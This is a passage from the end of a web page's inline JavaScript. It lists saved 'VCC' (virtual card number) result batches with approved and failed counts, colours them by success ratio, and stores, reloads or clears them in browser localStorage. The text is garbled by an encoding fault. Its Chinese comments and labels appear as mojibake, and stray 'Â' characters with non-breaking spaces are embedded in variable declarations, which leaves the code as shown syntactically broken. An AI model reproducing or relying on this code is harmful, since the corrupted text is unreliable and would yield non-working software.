    const opt = document.createElement('option');
    opt.value = idx;

    const totalÂ  Â = item.data.length;
    const success = item.data.filter(isApproved).length;
    const failÂ  Â  = total - success;

    opt.text = `${item.timestamp} - ${item.vcc} ï¼ˆæˆåŠŸ${success}/å¤±è´¥${fail}ï¼‰`;

    if (success === total)Â  Â  Â  Â opt.classList.add('all-success');
    else if (fail === total)Â  Â  Â opt.classList.add('all-fail');
    else {
      const ratio = success / total;Â  Â 
      const r = Math.round(255 * (1 - ratio));
      const g = Math.round(255 * ratio);
      opt.style.backgroundColor = `rgb(${r},${g},150)`; 
      opt.style.color = ratio > 0.5 ? '#155724' : '#721c24';
    }

    select.appendChild(opt);
  });
}

function saveHistory(list, originalJson) {
  let history = JSON.parse(localStorage.getItem('vccHistory') || '[]');
  
  // ç¡®ä¿æ—¶é—´æˆ³æ ¼å¼ç»Ÿä¸€ï¼Œæ–¹ä¾¿æ—¥æœŸç­›é€‰
  const now = new Date();
  const datePart = `${now.getFullYear()}/${now.getMonth() + 1}/${now.getDate()}`;
  const timePart = now.toLocaleTimeString();
  const timestamp = `${datePart} ${timePart}`;
  
  const vcc = list[0]?.virtual_card_number || "æœªçŸ¥VCC";
  history.push({ timestamp, vcc, data: list, originalJson: originalJson }); 
  if (history.length > 20) {
    history = history.slice(history.length - 20);
  }
  localStorage.setItem('vccHistory', JSON.stringify(history));
  updateHistorySelect();
}

/* ================= å†å²è®°å½•ï¼šåŠ è½½ (è¿˜åŸè¾“å…¥æ¡†æ•°æ®) ================= */
function loadHistory() {
  const select = document.getElementById('historySelect');
  const input = document.getElementById('jsonInput'); 
  const index = select.value;
  if(index === "") return;
  const history = JSON.parse(localStorage.getItem('vccHistory') || '[]');
  
  if(history[index]) {
    currentSortField = null; 
    currentSortOrder = 'asc';
    
    // è¿˜åŸåŸå§‹ JSON å­—ç¬¦ä¸²åˆ°è¾“å…¥æ¡†
    input.value = history[index].originalJson || `// è­¦å‘Š: å†å²è®°å½•æ•°æ®ä¸¢å¤±åŸå§‹ JSONï¼Œæ— æ³•è¿˜åŸã€‚åŠ è½½æ—¶é—´: ${history[index].timestamp}`;
    
    rawList = history[index].data;
    extractFields(rawList);
    renderTable(rawList);
    renderSummary(rawList);
  }
}

function clearHistory() {
  if(confirm('ç¡®è®¤æ¸…ç©ºå†å²è®°å½•å—ï¼Ÿ / Clear all history?')) {
    localStorage.removeItem('vccHistory');
    updateHistorySelect();
    document.getElementById('tableBody').innerHTML = "";
    document.getElementById('tableHead').innerHTML = "";
    document.getElementById('summary').style.display = 'none';
  }
}

/* ================= å¯åŠ¨ ================= */
updateHistorySelect();
</script>
</body>
</html>
